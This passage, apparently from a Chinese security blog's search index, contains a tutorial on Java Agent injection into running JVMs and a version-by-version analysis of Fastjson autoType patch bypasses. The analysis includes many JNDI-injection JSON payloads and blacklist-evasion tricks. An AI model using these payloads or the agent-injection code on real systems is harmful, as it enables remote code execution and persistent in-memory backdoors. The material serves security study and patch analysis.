args[0];\n\t\tString jarName = args[1];\n\n\t\tSystem.out.println(\"id ==> \" + id);\n\t\tSystem.out.println(\"jarName ==> \" + jarName);\n\n\t\tVirtualMachine virtualMachine = VirtualMachine.attach(id);\n\t\tvirtualMachine.loadAgent(jarName);\n\t\tvirtualMachine.detach();\n\n\t\tSystem.out.println(\"ends\");\n\t}\n}\n\n```\n通过pid向对应java程序进程注入附加Agent\n执行这段代码，就能将jar包附加上对应的进程\n\n#### VirtualMachineDescriptor \ncom.sun.tools.attach.VirtualMachineDescriptor类是一个用来描述特定虚拟机的类，其方法可以获取虚拟机的各种信息如PID、虚拟机名称等。下面是一个获取特定虚拟机PID的示例\n```java\npackage com.drunkbaby;  \n  \nimport com.sun.tools.attach.VirtualMachine;  \nimport com.sun.tools.attach.VirtualMachineDescriptor;  \n  \nimport java.util.List;  \n  \npublic class get_PID {  \n    public static void main(String[] args) {  \n  \n       \n\t\t//调用VirtualMachine.list()获取正在运行的JVM列表\n\t\tList<VirtualMachineDescriptor> list = VirtualMachine.list();\n\t\tfor(VirtualMachineDescriptor vmd : list){\n\n\t\t\t//遍历每一个正在运行的JVM，如果JVM名称为common.jar则返回其PID\n\t\t\tif(vmd.displayName().equals(\"common.jar\"))\n\t\t\t\tSystem.out.println(vmd.id());\n\t\t}\n  \n    }  \n}\n```\n如果我们启动一个comm.jar\n也可以使用这个类的方法,使用如下代码注入Agent，就不要手动找pid了\n```java\npackage com.yyjccc.Agent;\n\nimport com.sun.tools.attach.*;\n\nimport java.io.IOException;\nimport java.util.List;\n\npublic class Attacher {\n\tpublic static void main(String[] args) throws AgentLoadException, IOException, AgentInitializationException, AttachNotSupportedException {\n\t\tString agentJar=\"F:\\\\code\\\\java\\\\myAgent\\\\myAgent\\\\target\\\\artifacts\\\\myAgent_jar\\\\myAgent.jar\";\n\t\t//调用VirtualMachine.list()获取正在运行的JVM列表\n\t\tList<VirtualMachineDescriptor> list = VirtualMachine.list();\n\t\tfor(VirtualMachineDescriptor vmd : list){\n\n\t\t\t//遍历每一个正在运行的JVM，如果JVM名称为common.jar则返回其PID\n\t\t\tif(vmd.displayName().equals(\"common.jar\")){\n\t\t\t\tVirtualMachine virtualMachine = VirtualMachine.attach(vmd.id());\n\t\t\t\tvirtualMachine.loadAgent(agentJar);\n\t\t\t\tvirtualMachine.detach();\n\t\t\t\tSystem.out.println(\"attached pid \"+vmd.id());\n\t\t\t\tSystem.out.println(\"attached jar \"+agentJar);\n\t\t\t}\n\n\t\t}\n\t}\n}\n\n```\n以附加agentmain的方式可以不断使用上面程序进行注入\n<img src=\"/img/5-4/8.png\" >\n这里就附加了三次\n\n\n## Instrumentation\nInstrumentation 是 JVMTIAgent（JVM Tool Interface Agent）的一部分，Java agent 通过这个类和目标 JVM 进行交互，从而达到修改数据的效果。\n\n上面的只是附加运行代码，而Instrumentation能实现读取、修改已加载的字节码操作\n\n其在 Java 中是一个接口，常用方法如下\n```java\npublic interface Instrumentation {\n    \n    //增加一个Class 文件的转换器，转换器用于改变 Class 二进制流的数据，参数 canRetransform 设置是否允许重新转换。\n    void addTransformer(ClassFileTransformer transformer, boolean canRetransform);\n \n    //在类加载之前，重新定义 Class 文件，ClassDefinition 表示对一个类新的定义，如果在类加载之后，需要使用 retransformClasses 方法重新定义。addTransformer方法配置之后，后续的类加载都会被Transformer拦截。对于已经加载过的类，可以执行retransformClasses来重新触发这个Transformer的拦截。类加载的字节码被修改后，除非再次被retransform，否则不会恢复。\n    void addTransformer(ClassFileTransformer transformer);\n \n    //删除一个类转换器\n    boolean removeTransformer(ClassFileTransformer transformer);\n \n \n    //在类加载之后，重新定义 Class。这个很重要，该方法是1.6 之后加入的，事实上，该方法是 update 了一个类。\n    void retransformClasses(Class<?>... classes) throws UnmodifiableClassException;\n \n \n \n    //判断一个类是否被修改\n    boolean isModifiableClass(Class<?> theClass);\n \n    // 获取目标已经加载的类。\n    @SuppressWarnings(\"rawtypes\")\n    Class[] getAllLoadedClasses();\n \n    //获取一个对象的大小\n    long getObjectSize(Object objectToSize);\n \n}\n```\n\n### ClassFileTransformer\n转换类文件，该接口下只有一个方法：transform，重写该方法即可转换任意类文件，并返回新的被取代的类文件，在 java agent 内存马中便是在该方法下重写恶意代码，从而修改原有类文件代码逻辑，与 addTransformer 搭配使用。\n```java\n//增加一个Class 文件的转换器，转换器用于改变 Class 二进制流的数据，参数 canRetransform 设置是否允许重新转换。  \n    void addTransformer(ClassFileTransformer transformer, boolean canRetransform);\n```\n\n简单概括一下：\n\n1. 使用Instrumentation.addTransformer()来加载一个转换器。\n2. 转换器的返回结果（transform()方法的返回值）将成为转换后的字节码。\n3. 对于没有加载的类，会使用ClassLoader.defineClass()定义它；对于已经加载的类，会使用ClassLoader.redefineClasses()重新定义，并配合Instrumentation.retransformClasses进行转换。\n\n下面给出一个修改已加载类的例子\n程序运行下面代码\n```java\npackage com.yyjccc.Agent;\n\nimport static java.lang.Thread.sleep;\n\npublic class SayHello {\n    public static void main(String[] args) throws InterruptedException {\n        while(true) {\n            hello();\n            sleep(3000);\n        }\n    }\n\n    private static void hello() {\n        System.out.println(\"hello world \");\n    }\n}\n\n```\n\n\n编写agent：\n编写一个ClassFileTransformer的实现类，重写transform方法，然后使用javassist修改方法体\n```java\npackage com.yyjccc.transformer;\n\nimport javassist.ClassClassPath;\nimport javassist.ClassPool;\nimport javassist.CtClass;\nimport javassist.CtMethod;\n\nimport java.lang.instrument.ClassFileTransformer;\nimport java.lang.instrument.IllegalClassFormatException;\nimport java.security.ProtectionDomain;\n\npublic class Hello_Transform implements ClassFileTransformer {\n\t@Override\n\tpublic byte[] transform(ClassLoader loader, String className, Class<?> classBeingRedefined, ProtectionDomain protectionDomain, byte[] classfileBuffer) throws IllegalClassFormatException {\n\t\ttry {\n\t\t\t//获取CtClass 对象的容器 ClassPool\n\t\t\tClassPool classPool = ClassPool.getDefault();\n\t\t\t//添加额外的类搜索路径\n\t\t\tif (classBeingRedefined != null) {\n\t\t\t\tClassClassPath ccp = new ClassClassPath(classBeingRedefined);\n\t\t\t\tclassPool.insertClassPath(ccp);\n\t\t\t}\n\n\t\t\t//获取目标类\n\t\t\tCtClass ctClass = classPool.get(\"com.yyjccc.Agent.SayHello\");\n\t\t\t//获取目标方法\n\t\t\tCtMethod ctMethod = ctClass.getDeclaredMethod(\"hello\");\n\n\t\t\t//设置方法体\n\t\t\tString body = \"{System.out.println(\\\"Hacker!\\\");}\";\n\t\t\tctMethod.setBody(body);\n\n\t\t\t//返回目标类字节码\n\t\t\tbyte[] bytes = ctClass.toBytecode();\n\t\t\treturn bytes;\n\n\t\t}catch (Exception e){\n\t\t\te.printStackTrace();\n\t\t}\n        return null;\n\t}\n\n}\n\n```\nagentmain\n```java\npackage com.yyjccc;\n\nimport com.yyjccc.transformer.Hello_Transform;\n\nimport java.lang.instrument.Instrumentation;\nimport java.lang.instrument.UnmodifiableClassException;\n\npublic class EvalAgent {\n\tpublic static void agentmain(String args, Instrumentation inst) throws UnmodifiableClassException {\n\t\tClass [] classes = inst.getAllLoadedClasses();\n\n\t\t//获取目标JVM加载的全部类\n\t\tfor(Class cls : classes){\n\t\t\tif (cls.getName().equals(\"com.yyjccc.Agent.SayHello\")){\n\t\t\t\t//添加一个transformer到Instrumentation，并重新触发目标类加载\n\t\t\t\tinst.addTransformer(new Hello_Transform(),true);\n\t\t\t\tinst.retransformClasses(cls);\n\t\t\t}\n\t\t}\n\n}\n}\n\n```\nMANFIEST.MF设置运行可以重新类加载\n```java\nManifest-Version: 1.0\nPremain-Class: com.yyjccc.PerMain\nAgent-Class: com.yyjccc.EvalAgent\nCan-Redefine-Classes: true\nCan-Retransform-Classes: true\n\n```\n最后打jar包\n\n然后注入\n```java\npackage com.yyjccc.Agent;\n\nimport com.sun.tools.attach.*;\n\nimport java.io.IOException;\nimport java.util.List;\n\npublic class Attacher {\n\tpublic static void main(String[] args) throws AgentLoadException, IOException, AgentInitializationException, AttachNotSupportedException {\n\t\tString agentJar=\"F:\\\\code\\\\java\\\\myAgent\\\\myAgent\\\\target\\\\artifacts\\\\myAgent_jar\\\\myAgent.jar\";\n\t\t//调用VirtualMachine.list()获取正在运行的JVM列表\n\t\tList<VirtualMachineDescriptor> list = VirtualMachine.list();\n\t\tfor(VirtualMachineDescriptor vmd : list){\n\n\t\t\t//遍历每一个正在运行的JVM，如果JVM名称为common.jar则返回其PID\n\t\t\tif(vmd.displayName().equals(\"common.jar\")){\n\t\t\t\tVirtualMachine virtualMachine = VirtualMachine.attach(vmd.id());\n\t\t\t\tvirtualMachine.loadAgent(agentJar);\n\t\t\t\tvirtualMachine.detach();\n\t\t\t\tSystem.out.println(\"attached pid \"+vmd.id());\n\t\t\t\tSystem.out.println(\"attached jar \"+agentJar);\n\t\t\t}\n\n\t\t}\n\t}\n}\n\n```\n<img src=\"/img/5-4/9.png\" >\n\n### 局限性\n大多数情况下，我们使用 Instrumentation 都是使用其字节码插桩的功能，简单来说就是类重定义功能（Class Redefine），但是有以下局限性：\npremain 和 agentmain 两种方式**修改字节码**的时机都是类文件加载之后，也就是说必须要带有 Class 类型的参数，不能通过字节码文件和自定义的类名重新定义一个本来不存在的类。\n类的字节码修改称为类转换 (Class Transform)，类转换其实最终都回归到类重定义 Instrumentation#redefineClasses 方法，此方法有以下限制：\n\n1. 新类和老类的父类必须相同\n2. 新类和老类实现的接口数也要相同，并且是相同的接口\n3. 新类和老类访问符必须一致。 新类和老类字段数和字段名要一致\n4. 新类和老类新增或删除的方法必须是 private static/final 修饰的\n5. 可以修改方法体\n\n## Maven插件\n不去手动写MANIFREST.MF文件的方式，使用maven插件：\n```xml\n<plugin>\n  <groupId>org.apache.maven.plugins</groupId>\n  <artifactId>maven-jar-plugin</artifactId>\n  <version>3.1.0</version>\n  <configuration>\n    <archive>\n      <!--自动添加META-INF/MANIFEST.MF -->\n      <manifest>\n        <addClasspath>true</addClasspath>\n      </manifest>\n      <manifestEntries>\n        <Agent-Class>com.yyjccc.EvalAgent</Agent-Class>\n        <Can-Redefine-Classes>true</Can-Redefine-Classes>\n        <Can-Retransform-Classes>true</Can-Retransform-Classes>\n      </manifestEntries>\n    </archive>\n  </configuration>\n</plugin>\n\n```\n\n## Reference\n\n- [Java Agent 入门](https://paoka1.top/2023/04/07/Java-Agent-%E5%85%A5%E9%97%A8/)\n- [Java Agent 内存马学习 | Drunkbaby’s Blog](https://drun1baby.top/2023/12/07/Java-Agent-%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/)\n- [https://docs.oracle.com/javase/8/docs/api/java/lang/instrument/package-summary.html](https://docs.oracle.com/javase/8/docs/api/java/lang/instrument/package-summary.html)\n- [Java Agent 从入门到内存马 - 先知社区](https://xz.aliyun.com/t/9450?time__1311=n4%2BxuDgD9Ad40lDl%3DoGkYD8jNeiI%3DNdG8eD)\n","tags":["java","Agent"],"categories":["java安全"]},{"title":"fastjson高版本补丁绕过","url":"/2024/04/27/fastjson高版本补丁绕过/","content":"\n\n\n\n\n\n# fastjson高版本补丁绕过\n\n\n\n## 补丁分析\n### 1.2.25\n在 Fastjson1.2.25 中使用了 checkAutoType 来修复1.2.22-1.2.24中的漏洞，其中有个 autoTypeSupport 默认为 False。当 autoTypeSupport 为 False 时，先黑名单过滤，再白名单过滤，若白名单匹配上则直接加载该类，否则报错。当 autoTypeSupport 为 True 时，先白名单过滤，匹配成功即可加载该类，否则再黑名单过滤。对于开启或者不开启，都有相应的绕过方法。\n\n在获取@type的值后，1.2.24以后的版本新增函数checkAutoType,在类加载之前检查是否允许加载\n<img src=\"/img/24-7-18/1.png\" >\n进入ParseConfig#checkAutoType\n在尝试取缓存无法取到的时候，\n先进行黑名单过滤，类名不能是以黑名单的开头\n<img src=\"/img/24-7-18/2.png\" >\n黑名单\n<img src=\"/img/24-7-18/3.png\" >\n那基本就是被黑名单限制了，导致异常提前退出异常\n若是手动开启了AutoType，那么就是先白名单，再黑名单，再取缓存\n<img src=\"/img/24-7-18/4.png\" >\n流程图\n<img src=\"/img/24-7-18/5.png\" >\n\n### 1.2.42\n1.2.42相较于之前的版本，关键是在ParserConfig.java中修改了以下两点\n\n- 黑名单改为了hash值，防止绕过\n- 对于传入的类名，删除开头L和结尾的;\n\n从1.2.42版本开始，Fastjson把原本明文形式的黑名单改成了哈希过的黑名单，目的就是为了防止安全研究者对其进行研究 ( 可恶（:  ），提高漏洞利用门槛，但是有人已在Github上跑出了大部分黑名单包类：\n[GitHub - LeadroyaL/fastjson-blacklist](https://github.com/LeadroyaL/fastjson-blacklist)\n\n<img src=\"/img/24-7-18/6.png\" >\n首先第一步就是各种运算，起初还没看懂在干什么，感觉就是给读者做混淆\n应该与下面的if条件是一样的\n<img src=\"/img/24-7-18/7.png\" >\n白名单和黑名单都是采用特殊的运算计算hash，从寻找黑白名单中是否有计算出的hash\n<img src=\"/img/24-7-18/8.png\" >\n\n### 1.2.43\n添加检查\n<img src=\"/img/24-7-18/9.png\" >\n在原本检查L和；基础上检查类名的第二个字符是否为L如果是就直接异常退出\n就是排除类名是以LL开头的情况，然后再截取\n\n### 1.2.48\n并将java.lang.Class类放入了黑名单，这样彻底封死了从mapping中加载恶意类\n\n\n\n**设置AutoType**\n默认情况下autoTypeSupport为False，将其设置为True有两种方法：\n\n- JVM启动参数：-Dfastjson.parser.autoTypeSupport=true\n- 代码中设置：ParserConfig.getGlobalInstance().setAutoTypeSupport(true);，如果有使用非全局ParserConfig则用另外调用setAutoTypeSupport(true);\n\n\n之后的payload 有些需要开启AutoType\n\n## 无需开启AutoType\n### 低于1.2.47版本的补丁绕过\n说明：\n\n- 1.2.25-1.2.32版本：未开启AutoTypeSupport时能成功利用，开启AutoTypeSupport反而不能成功触发；\n- 1.2.33-1.2.47版本：无论是否开启AutoTypeSupport，都能成功利用；\n\n通过缓存绕过，payload如下：\n```json\n{\n  \"a\":{\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"},\n  \"b\":{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\n    \"DataSourceName\":\"rmi://127.0.0.1:8085/dzJvybqs\",\n    \"AutoCommit\":false\n  }\n}\n```\n\npayload主要是分为两部分\n调式\n第一部分：\n首先java.lang.Class是默认支持的类，所以可以直接从白名单IdentityHashMap中拿出\n从白名单中拿出的类默认是MiscCodec这个类来进行反序列化\n MiscCodec#deserialze方法中默认是往下读取val属性\n<img src=\"/img/24-7-18/10.png\" >\n然后解析json得到val属性的值\n然后加载val对应值的类\n<img src=\"/img/24-7-18/11.png\" >\n在加载类的时候，把对应类加载后，放入mapping缓存，这也是绕过的关键--放入mapping缓存\n<img src=\"/img/24-7-18/12.png\" >\n\n第二部分\n直接先从缓存中获取\n<img src=\"/img/24-7-18/13.png\" >\n因为之前加载前面的类的时候已经放入过mapping了，所以这里能够直接拿到\n<img src=\"/img/24-7-18/14.png\" >\n拿到class后就会直接返回，就不会走到后面触发异常\n\n### 低于1.2.68版本的补丁绕过\n条件\n\n- Fastjson <= 1.2.68\n- 利用类必须是expectClass类的子类或实现类，并且不在黑名单中\n\n1.2.68版本后，fastjson新增safemode模式，可以完全关闭AutoType：\n[https://github.com/alibaba/fastjson/wiki/fastjson_safemode](https://github.com/alibaba/fastjson/wiki/fastjson_safemode)\n\n本次绕过checkAutoType()函数的关键点在于其第二个参数expectClass，可以通过构造恶意JSON数据、传入某个类作为expectClass参数再传入另一个expectClass类的子类或实现类来实现绕过checkAutoType()函数执行恶意操作。\n简单地说，本次绕过checkAutoType()函数的攻击步骤为：\n\n1. 先传入某个类，其加载成功后将作为expectClass参数传入checkAutoType()函数；\n2. 查找expectClass类的子类或实现类，如果存在这样一个子类或实现类其构造方法或setter方法中存在危险操作则可以被攻击利用；\n\n假设现在已知这个类（这里我们就自己写一个）\n<img src=\"/img/24-7-18/15.png\" >\npayload如下：\n```json\n{\"@type\":\"java.lang.AutoCloseable\",\"@type\":\"org.example.VulAutoCloseable\",\"cmd\":\"calc\"}\n```\n\n后面获取到JavaBeanDeserializer,直接看deserialze方法\n<img src=\"/img/24-7-18/16.png\" >\n此时已经是已经加载了前面的java.lang.AutoCloseable，所以这里expectClass不为空\n<img src=\"/img/24-7-18/17.png\" >\n在这里expectClassFlag设置为true\n到后面\n<img src=\"/img/24-7-18/18.png\" >\n然后loadClass返回\n<img src=\"/img/24-7-18/19.png\" >\n然后还是会检查是否为被ban的相关类,判断目标类是否是expectClass类的子类，是的话就添加到Mapping缓存中并直接返回该目标类，否则直接抛出异常导致利用失败，**这里就解释了为什么恶意类必须要继承AutoCloseable接口类，因为这里expectClass为AutoCloseable类、因此恶意类必须是AutoCloseable类的子类才能通过这里的判断**：\n<img src=\"/img/24-7-18/20.png\" >\n总结：第一个 `@type` 进去什么都没有发生；但是第一个 `@type` 是作为第二个指定的类里面的 expectClass。所以说白了，loadClass 去作用的类是第一个 `@type`；如果这个 `@type` 是可控的恶意类，可以造成命令执行攻击。\n并且需要加载的目标类是expectClass类的子类或者实现类时（不在黑名单中）\n\n这里直接参考[b1ue大佬文章](https://b1ue.cn/archives/364.html)，主要是寻找关于输入输出流的类来写文件，IntputStream和OutputStream都是实现自AutoCloseable接口的。\n,相关实际应用为利用fastjson写文件，参考：[https://www.yuque.com/yyjccc/pk74ko/de45vsli00bmwtuh](https://www.yuque.com/yyjccc/pk74ko/de45vsli00bmwtuh)\n\n看GitHub官方的diff，主要在ParserConfig.java中：[https://github.com/alibaba/fastjson/compare/1.2.68%E2%80%A61.2.69#diff-f140f6d9ec704eccb9f4068af9d536981a644f7d2a6e06a1c50ab5ee078ef6b4](https://github.com/alibaba/fastjson/compare/1.2.68%E2%80%A61.2.69#diff-f140f6d9ec704eccb9f4068af9d536981a644f7d2a6e06a1c50ab5ee078ef6b4)\n对比看到expectClass的判断逻辑中，对类名进行了Hash处理再比较哈希黑名单，并且添加了三个类：\n<img src=\"/img/24-7-18/21.png\" >\n网上已经有了利用彩虹表碰撞的方式得到的新添加的三个类分别为：\n\n| **版本** | **十进制Hash值** | **十六进制Hash值** | **类名** |\n| --- | --- | --- | --- |\n| 1.2.69 | 5183404141909004468L | 0x47ef269aadc650b4L | java.lang.Runnable |\n| 1.2.69 | 2980334044947851925L | 0x295c4605fd1eaa95L | java.lang.Readable |\n| 1.2.69 | -1368967840069965882L | 0xed007300a7b227c6L | java.lang.AutoCloseable |\n\n这就简单粗暴地防住了这几个类导致的绕过问题了。\n## 需要开启AutoType\n### 1.2.25-1.2.41绕过\n做法：在@type指定的类前加上'L',后面加上';'\n如：\n```json\n{\" \n    \"\\\"@type\\\":\\\"Lcom.sun.rowset.JdbcRowSetImpl;\\\",\" +\n    \"\\\"dataSourceName\\\":\\\"ldap://127.0.0.1:9999/EXP\\\", \" +\n    \"\\\"autoCommit\\\":true\" \n\"}\n//其他利用链也同理\n```\n这样绕过了黑名，看看怎么加载类的\n\n流程\n在ParseConfig#checkAutoType中\n由于开启autoTypeSupport所以其为True，能通过黑名单\n到达\n<img src=\"/img/24-7-18/22.png\" >\n跟进\n<img src=\"/img/24-7-18/23.png\" >\n发现类名要是以L开头并且以；结尾就会去除这些字符再递归调用\n上面流程又得到了未变化之前的类名，可以正常的加载\n<img src=\"/img/24-7-18/24.png\" >\n\n### 1.2.42绕过\n做法：在@type指定的类前加上两个'L',后面加上两个';'\n如：\n```json\n{\" \n    \"\\\"@type\\\":\\\"LLcom.sun.rowset.JdbcRowSetImpl;;\\\",\" +\n    \"\\\"dataSourceName\\\":\\\"ldap://127.0.0.1:9999/EXP\\\", \" +\n    \"\\\"autoCommit\\\":true\" \n\"}\n//其他利用链也同理\n```\n\n\n<img src=\"/img/24-7-18/25.png\" >\n这里只截取了一次，所以可以再套一层，类名前面两个L后面两个；\n\n由于是递归使用的loadClass所以可以去除两层\n<img src=\"/img/24-7-18/26.png\" >\n### 1.2.43绕过\n操作: 类名前添加'['，类名引号外添加' [{ '\n```json\n{\n    \"@type\":\"[com.sun.rowset.JdbcRowSetImpl\"[{,\n    \"dataSourceName\":\"ldap://localhost:1399/Exploit\", \n    \"autoCommit\":true\n}\n//其他利用链也同理\n```\n利用前面1.2.41的类似的还有一个if条件，就是以[开头,\n尝试直接以[开头，报错\n<img src=\"/img/24-7-18/27.png\" >\n根据报错JdbcRowSetImpl\" 后面期望是[而不是','那就满足他，在','前添加[\n还是报错\n<img src=\"/img/24-7-18/28.png\" >\n继续添加{\n执行成功\n<img src=\"/img/24-7-18/29.png\" >\n\n\n与之前不同的是，进入的是前面的一个if条件\n<img src=\"/img/24-7-18/30.png\" >\n\n最后得到的类是一个数组类\n<img src=\"/img/24-7-18/31.png\" >\n获取到的反序列就是ObjectArrayCodec\n<img src=\"/img/24-7-18/32.png\" >\n继续跟进\n<img src=\"/img/24-7-18/33.png\" >\n获取具体的类\n创建数组JSONArray\n然后parseArray\n<img src=\"/img/24-7-18/34.png\" >\n后面的流程应该就一样了\n\n### 1.2.45绕过(MyBatis JNDI注入链)\n1.2.45版本添加了一些黑名单，但是存在组件漏洞，我们能通过mybatis组件进行JNDI接口调用，进而加载恶意类。\n\n**条件**:\n\n- 高版本开启AutoType\n- mybatis相关依赖\n```json\n<dependency>\n        <groupId>org.mybatis</groupId>\n        <artifactId>mybatis</artifactId>\n        <version>3.5.6</version>\n    </dependency>\n```\n\n**poc**\n```json\n{\n    \"@type\":\"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory\",\n    \"properties\":{\n        \"data_source\":\"ldap://127.0.0.1：9999/EXP\"\n    }\n}\n```\n过程\n触发setter方法\nJndiDataSourceFactory#setProperties方法\n<img src=\"/img/24-7-18/35.png\" >\n传入的参数刚好就是键值对\n这里会初始化上下文环境\n然后就行look\nlook查询的是键值对（Properties）中key为data_source的值\n<img src=\"/img/24-7-18/36.png\" >\n\n### 1.2.62-1.2.68版本\n#### 1.2.62\n条件：\n\n- 需要开启AutoType；\n- JNDI注入利用所受的JDK版本限制；\n- 目标服务端需要存在xbean-reflect包\n\n也是新 Gadget 绕过黑名单限制。\n依赖\n```xml\n<dependency>  \n <groupId>org.apache.xbean</groupId>  \n <artifactId>xbean-reflect</artifactId>  \n <version>4.18</version>  \n</dependency>  \n```\n**分析**：\norg.apache.xbean.propertyeditor.JndiConverter  类的 toObjectImpl() 函数存在 JNDI 注入漏洞，可由其构造函数处触发利用。\n<img src=\"/img/24-7-18/37.png\" >\n\n触发点在其父类AbstractConverter 的setAsText中\n<img src=\"/img/24-7-18/38.png\" >\n\ntoObject 又调用toObjectImpl\n<img src=\"/img/24-7-18/39.png\" >\n**poc**\n```json\n{\"@type\":\"org.apache.xbean.propertyeditor.JndiConverter\",\"AsText\":\"ldap://127.0.0.1:8085/tmuCzovY\"}\n```\n\n#### 1.2.66\n**条件**\n\n- 开启AutoType；\n- JNDI注入利用所受的JDK版本限制；\n- org.apache.shiro.jndi.JndiObjectFactory类需要shiro-core包；\n- br.com.anteros.dbcp.AnterosDBCPConfig 类需要 Anteros-Core和 Anteros-DBCP 包；\n- com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig类需要ibatis-sqlmap和jta包；\n\n\norg.apache.shiro.realm.jndi.JndiRealmFactory类PoC：\n```json\n{\"@type\":\"org.apache.shiro.realm.jndi.JndiRealmFactory\", \"jndiNames\":[\"ldap://localhost:1389/Exploit\"], \"Realms\":[\"\"]}\n```\nbr.com.anteros.dbcp.AnterosDBCPConfig类PoC：\n```json\n{\"@type\":\"br.com.anteros.dbcp.AnterosDBCPConfig\",\"metricRegistry\":\"ldap://localhost:1389/Exploit\"}或{\"@type\":\"br.com.anteros.dbcp.AnterosDBCPConfig\",\"healthCheckRegistry\":\"ldap://localhost:1389/Exploit\"}\n```\ncom.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig类PoC：\n```json\n{\"@type\":\"com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig\",\"properties\": {\"@type\":\"java.util.Properties\",\"UserTra\n```\n\n#### 1.2.67\n**条件**：\n\n- 开启AutoType；\n- JNDI注入利用所受的JDK版本限制；\n- org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup类需要ignite-core、ignite-jta和jta依赖；\n- org.apache.shiro.jndi.JndiObjectFactory类需要shiro-core和slf4j-api依赖；\n\norg.apache.ignite.cache.jta.jndi.CacheJndiTmLookup类PoC：\n```json\n{\"@type\":\"org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup\", \"jndiNames\":[\"ldap://localhost:1389/Exploit\"], \"tm\": {\"$ref\":\"$.tm\"}}\n```\norg.apache.shiro.jndi.JndiObjectFactory类PoC：\n```json\n{\"@type\":\"org.apache.shiro.jndi.JndiObjectFactory\",\"resourceName\":\"ldap://localhost:1389/Exploit\",\"instance\":{\"$ref\":\"$.instance\"}}\n```\n\n## 其他一些绕过黑名单的Gadget\n这里补充下其他一些Gadget，可自行尝试。注意，均需要开启AutoType，且会被JNDI注入利用所受的JDK版本限制。\n### 1.2.59\ncom.zaxxer.hikari.HikariConfig类PoC：\n```json\n{\"@type\":\"com.zaxxer.hikari.HikariConfig\",\"metricRegistry\":\"ldap://localhost:1389/Exploit\"}或{\"@type\":\"com.zaxxer.hikari.HikariConfig\",\"healthCheckRegistry\":\"ldap://localhost:1389/Exploit\"}\n```\n### 1.2.61\norg.apache.commons.proxy.provider.remoting.SessionBeanProvider类PoC：\n**JSON**\n```json\n{\"@type\":\"org.apache.commons.proxy.provider.remoting.SessionBeanProvider\",\"jndiName\":\"ldap://localhost:1389/Exploit\",\"Object\":\"a\"}\n```\n### 1.2.62\norg.apache.cocoon.components.slide.impl.JMSContentInterceptor类PoC：\n**JSON**\n```json\n{\"@type\":\"org.apache.cocoon.components.slide.impl.JMSContentInterceptor\", \"parameters\": {\"@type\":\"java.util.Hashtable\",\"java.naming.factory.initial\":\"com.sun.jndi.rmi.registry.RegistryContextFactory\",\"topic-factory\":\"ldap://localhost:1389/Exploit\"}, \"namespace\":\"\"}\n```\n### 1.2.68\norg.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfig类PoC：\n**JSON**\n```json\n{\"@type\":\"org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfig\",\"metricRegistry\":\"ldap://localhost:1389/Exploit\"}或{\"@type\":\"org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfig\",\"healthCheckRegistry\":\"ldap://localhost:1389/Exploit\"}\n```\ncom.caucho.config.types.ResourceRef类PoC：\n**JSON**\n```json\n{\"@type\":\"com.caucho.config.types.ResourceRef\",\"lookupName\": \"ldap://localhost:1389/Exploit\", \"value\": {\"$ref\":\"$.value\"}}\n```\n### 未知版本\norg.apache.aries.transaction.jms.RecoverablePooledConnectionFactory类PoC：\n**JSON**\n```json\n{\"@type\":\"org.apache.aries.transaction.jms.RecoverablePooledConnectionFactory\", \"tmJndiName\": \"ldap://localhost:1389/Exploit\", \"tmFromJndi\": true, \"transactionManager\": {\"$ref\":\"$.transactionManager\"}}\n```\norg.apache.aries.transaction.jms.internal.XaPooledConnectionFactory类PoC：\n**JSON**\n```json\n{\"@type\":\"org.apache.aries.transaction.jms.internal.XaPooledConnectionFactory\", \"tmJndiName\": \"ldap://localhost:1389/Exploit\", \"tmFromJndi\": true, \"transactionManager\": {\"$ref\":\"$.transactionManager\"}}\n```\n## 参考资料\n\n[浅析Fastjson1.2.62-1.2.68反序列化漏洞-安全客 - 安全资讯平台](https://www.anquanke.com/post/id/232774)\n[https://drun1baby.top/2022/08/13/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Fastjson%E7%AF%8704-Fastjson1-2-62-1-2-68%E7%89%88%E6%9C%AC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/#0x02-1-2-62-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E](https://drun1baby.top/2022/08/13/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Fastjson%E7%AF%8704-Fastjson1-2-62-1-2-68%E7%89%88%E6%9C%AC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/#0x02-1-2-62-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E)\n\n\n\n\n\n### \n\n\n\n\n\n## 各个版本的payload\n\n- [FastJsonParty/Fastjson全版本检测及利用-Poc.md at main · lemono0/FastJsonParty](https://github.com/lemono0/FastJsonParty/blob/main/Fastjson%E5%85%A8%E7%89%88%E6%9C%AC%E6%A3%80%E6%B5%8B%E5%8F%8A%E5%88%A9%E7%94%A8-Poc.md)\n- [GitHub - safe6Sec/Fastjson: Fastjson姿势技巧集合](https://github.com/safe6Sec/Fastjson)\n\n## Reference\n\n- [Java反序列化Fastjson篇03-Fastjson各版本绕过分析 | Drunkbaby’s Blog](https://drun1baby.top/2022/08/08/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Fastjson%E7%AF%8703-Fastjson%E5%90%84%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87%E5%88%86%E6%9E%90/)\n- 